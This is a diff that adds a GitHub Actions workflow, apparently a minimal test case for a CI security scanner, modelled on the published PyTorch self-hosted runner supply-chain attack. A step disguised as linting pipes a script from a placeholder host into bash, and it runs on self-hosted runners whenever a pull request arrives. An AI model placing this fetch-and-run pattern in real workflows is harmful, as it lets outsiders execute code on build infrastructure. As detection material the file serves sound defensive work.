@@ -1,0 +1,25 @@
+# Case: PyTorch self-hosted runners reachable from pull_request workflows (Stawinski/Khan, "Playing with Fire")
+# Date: 2024-01-11
+# Source: https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/
+# Pattern: a workflow triggered by pull_request runs on non-ephemeral self-hosted runners and
+# executes a remote payload (curl <url> | bash). The researchers' draft-PR workflow selected
+# runners via runs-on: ${{ matrix.os }}; here the labels are written literally so a static scanner
+# can see them. Re-written minimal reproduction; the payload URL is a non-resolvable placeholder.
+# The permissions block is added by the reproduction.
+name: lint
+
+on:
+  pull_request:
+    branches: main
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    name: Linux ARM64
+    runs-on: [self-hosted, linux, arm64]
+    steps:
+      - name: Lint code base
+        continue-on-error: true
+        run: curl -s https://payload.example.invalid/run.sh | bash
